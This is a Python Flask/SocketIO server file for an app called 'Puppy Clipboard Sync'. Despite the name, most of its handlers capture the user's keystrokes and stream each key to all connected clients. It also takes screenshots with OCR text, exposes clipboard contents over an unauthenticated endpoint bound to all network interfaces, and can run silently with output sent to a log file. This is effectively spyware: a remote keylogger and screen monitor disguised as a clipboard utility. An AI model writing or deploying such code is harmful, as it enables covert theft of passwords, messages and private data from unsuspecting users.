"""
Main Flask application for Puppy Clipboard Sync
"""

import sys
import os
import io

# Fix encoding for Windows — prevents crash from emoji in print() statements
# When running under pythonw.exe, stdout/stderr are None, so redirect to log file
if sys.stdout is None or sys.stderr is None:
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server.log')
    log_file = open(log_path, 'w', encoding='utf-8')
    sys.stdout = log_file
    sys.stderr = log_file
else:
    # Force UTF-8 encoding for regular console
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    if hasattr(sys.stderr, 'reconfigure'):
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')

from flask import Flask, jsonify, render_template_string
from flask_socketio import SocketIO, emit
import pyperclip
import threading
from config import (
    FLASK_HOST, FLASK_PORT, FLASK_SECRET_KEY,
    CORS_ALLOWED_ORIGINS, DEBUG
)
from ui import HTML_TEMPLATE
from keyboard_handler import keyboard_handler
from screenshot_handler import screenshot_handler

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = FLASK_SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins=CORS_ALLOWED_ORIGINS)

# Global state
listening = False


# ==================== Routes ====================

@app.route('/')
def index():
    """Serve the main UI"""
    return render_template_string(HTML_TEMPLATE)


@app.route('/get')
def get_clip():
    """Get current clipboard content"""
    try:
        text = pyperclip.paste()
    except Exception as e:
        print(f"Error reading clipboard: {e}")
        text = ""
    return jsonify({"text": text})


# ==================== WebSocket Events ====================

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print('✅ Client connected')
    emit('live_status', {'status': 'listening' if listening else 'stopped'})


@socketio.on('start_capture')
def handle_start_capture():
    """Start keyboard capture"""
    global listening
    if not listening:
        listening = True
        print('🎯 Starting keyboard capture...')
        keyboard_handler.set_keystroke_callback(emit_keystroke)
        keyboard_handler.start_listening()
        emit('live_status', {'status': 'capturing keystrokes'}, to=None)


@socketio.on('stop_capture')
def handle_stop_capture():
    """Stop keyboard capture"""
    global listening
    if listening:
        listening = False
        print('⛔ Stopping keyboard capture...')
        keyboard_handler.stop_listening()
        emit('live_status', {'status': 'stopped'}, to=None)


@socketio.on('request_screenshot')
def handle_screenshot_request():
    """Handle screenshot request from client"""
    print('📸 Screenshot requested via web interface')
    result = screenshot_handler.capture_screenshot()
    
    # Prepare response
    response = {
        'success': result.get('success', False),
        'timestamp': result.get('timestamp'),
        'ocr_text': result.get('ocr_text'),
        'image_base64': result.get('image_base64'),
        'resolution': result.get('resolution'),
        'error': result.get('error')
    }
    
    # Emit to all clients
    emit('screenshot_result', response, to=None)


# ==================== Callbacks ====================

def emit_keystroke(char):
    """Emit keystroke to connected clients"""
    socketio.emit('keystroke', {'key': char}, to=None)


def on_screenshot_capture(result):
    """Callback when screenshot is captured"""
    print('📸 Screenshot captured')
    response = {
        'success': result.get('success', False),
        'timestamp': result.get('timestamp'),
        'image_base64': result.get('image_base64'),
        'resolution': result.get('resolution'),
        'error': result.get('error')
    }
    socketio.emit('screenshot_result', response, to=None)


# ==================== Setup ====================

def setup_handlers():
    """Initialize all handlers"""
    print("\n" + "="*50)
    print("🐕 Puppy Clipboard Sync - Setup")
    print("="*50)
    
    # Setup screenshot handler
    screenshot_handler.set_screenshot_callback(on_screenshot_capture)
    
    print("="*50 + "\n")


# ==================== Main ====================

if __name__ == '__main__':
    setup_handlers()
    
    print(f"🚀 Starting Puppy Clipboard Sync...")
    print(f"📡 Server: http://0.0.0.0:{FLASK_PORT}")
    print(f"⌨️  Keyboard Capture: Available")
    print(f"📸 Screenshot: Available")
    print("\n")
    
    try:
        socketio.run(app, host=FLASK_HOST, port=FLASK_PORT, debug=DEBUG, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print("\n⛔ Shutting down...")
        keyboard_handler.stop_listening()
        print("✅ Cleanup complete")
